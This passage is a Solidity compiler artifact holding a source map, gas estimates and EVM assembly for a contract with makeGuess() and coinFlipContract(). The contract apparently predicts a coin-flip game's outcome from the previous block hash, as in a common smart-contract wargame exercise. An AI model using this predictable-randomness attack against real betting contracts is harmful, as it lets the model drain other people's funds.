5;;1475:20;1493:1;1475:20;:::i;:::-;1470:25;;1514:1;1511;1508:8;1505:2;;;1519:18;;:::i;:::-;1505:2;1564:1;1561;1557:9;1549:17;;1426:146;;;;:::o;1578:90::-;;1655:5;1648:13;1641:21;1630:32;;1620:48;;;:::o;1674:126::-;;1751:42;1744:5;1740:54;1729:65;;1719:81;;;:::o;1806:77::-;;1872:5;1861:16;;1851:32;;;:::o;1889:156::-;;1987:52;2033:5;1987:52;:::i;:::-;1974:65;;1964:81;;;:::o;2051:128::-;;2149:24;2167:5;2149:24;:::i;:::-;2136:37;;2126:53;;;:::o;2185:180::-;2233:77;2230:1;2223:88;2330:4;2327:1;2320:15;2354:4;2351:1;2344:15;2371:180;2419:77;2416:1;2409:88;2516:4;2513:1;2506:15;2540:4;2537:1;2530:15;2557:116;2627:21;2642:5;2627:21;:::i;:::-;2620:5;2617:32;2607:2;;2663:1;2660;2653:12;2607:2;2597:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "176200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"coinFlipContract()": "1232",
								"makeGuess()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 172,
									"end": 249,
									"name": "PUSH",
									"source": 1,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 155,
									"end": 249,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 155,
									"end": 249,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 258,
									"end": 368,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 342,
									"end": 359,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 314,
									"end": 330,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 314,
									"end": 330,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 314,
									"end": 360,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 314,
									"end": 360,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 314,
									"end": 360,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 314,
									"end": 360,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 258,
									"end": 368,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 7,
									"end": 150,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 95,
									"end": 101,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 89,
									"end": 102,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 138,
									"end": 143,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 156,
									"end": 440,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 275,
									"end": 277,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 263,
									"end": 272,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 254,
									"end": 261,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 250,
									"end": 273,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 246,
									"end": 278,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 291,
									"end": 292,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 288,
									"end": 289,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 281,
									"end": 293,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 334,
									"end": 335,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 415,
									"end": 422,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 406,
									"end": 412,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 395,
									"end": 404,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 391,
									"end": 413,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "tag",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 305,
									"end": 433,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "tag",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 446,
									"end": 542,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "17"
								},
								{
									"begin": 530,
									"end": 535,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "tag",
									"source": 2,
									"value": "17"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 501,
									"end": 536,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 501,
									"end": 536,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "tag",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 548,
									"end": 674,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 667,
									"name": "PUSH",
									"source": 2,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 618,
									"end": 623,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 614,
									"end": 668,
									"name": "AND",
									"source": 2
								},
								{
									"begin": 603,
									"end": 668,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 603,
									"end": 668,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 771,
									"end": 776,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "tag",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 746,
									"end": 751,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 743,
									"end": 778,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 733,
									"end": 735,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 792,
									"end": 793,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 789,
									"end": 790,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 782,
									"end": 794,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 733,
									"end": 735,
									"name": "tag",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 723,
									"end": 802,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 723,
									"end": 802,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 86,
									"end": 621,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 86,
									"end": 621,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220543d1d06066c46476da9229d6d949d3ccab3a77528281795b03d89c9bb2ead3d64736f6c63430008000033",
									".code": [
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "53B3B3B3"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "931C9F32"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 86,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 86,
											"end": 621,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 374,
											"end": 618,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 116,
											"end": 148,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 116,
											"end": 148,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 374,
											"end": 618,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 415,
											"end": 433,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 467,
											"end": 468,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 454,
											"end": 466,
											"name": "NUMBER",
											"source": 1
										},
										{
											"begin": 454,
											"end": 468,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 454,
											"end": 468,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 454,
											"end": 468,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 454,
											"end": 468,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 454,
											"end": 468,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 454,
											"end": 468,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 454,
											"end": 468,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 444,
											"end": 469,
											"name": "BLOCKHASH",
											"source": 1
										},
										{
											"begin": 436,
											"end": 470,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 436,
											"end": 470,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 415,
											"end": 470,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 415,
											"end": 470,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 481,
											"end": 497,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 511,
											"end": 517,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 511,
											"end": 517,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 500,
											"end": 510,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 500,
											"end": 517,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 500,
											"end": 517,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 500,
											"end": 517,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 500,
											"end": 517,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 500,
											"end": 517,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 500,
											"end": 517,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 500,
											"end": 517,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 481,
											"end": 517,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 481,
											"end": 517,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 528,
											"end": 538,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 553,
											"end": 554,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 541,
											"end": 549,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 541,
											"end": 554,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 541,
											"end": 569,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 541,
											"end": 569,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 564,
											"end": 569,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 541,
											"end": 569,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 541,
											"end": 569,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 541,
											"end": 569,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 541,
											"end": 569,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 557,
											"end": 561,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 541,
											"end": 569,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 541,
											"end": 569,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 528,
											"end": 569,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 528,
											"end": 569,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 582,
											"end": 598,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 582,
											"end": 598,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 582,
											"end": 598,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 582,
